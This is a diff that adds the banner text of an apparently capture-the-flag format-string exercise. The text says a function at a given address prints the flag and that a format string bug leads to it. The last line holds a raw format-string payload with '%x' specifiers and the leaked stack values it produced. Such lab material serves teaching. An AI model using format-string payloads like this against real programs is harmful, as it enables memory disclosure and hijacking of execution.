@@ -1,0 +1,15 @@
+   ____                    __        __      _            	
+  / __/__  ______ _  ___ _/ /_  ____/ /_____(_)__  ___ _  	
+ / _// _ \/ __/  ' \/ _ `/ __/ (_.-/ __/ __/ / _ \/ _ `/  	
+/_/  \___/_/ /_/_/_/\_,_/\__/ /___/__/ _/ /_/_//_/\_, /   	
+                                                 /___/    	
+ +-+-+-+-+-+-+-+-+ +-+-+-+ +-+-+-+
+ |c h a n g i n g| |t h e| |e i p|
+ +-+-+-+-+-+-+-+-+ +-+-+-+ +-+-+-+
+Once thought to be just a lazy short cut,
+actually leads to remote code execution!
+
+We have a function at 0x8048598 which prints the flag
+The power of the format string vuln will
+guide you to this function.
+format string> AMóÿ¿!`û·!%0$x.63.b7fb6c20.b7fdbb58.195.b7e0f940.41fff418.bffff34d.24372521.30252173.252e7824.2e782431.78243225.2433252e.34252e78.252e7824.%Having fun?
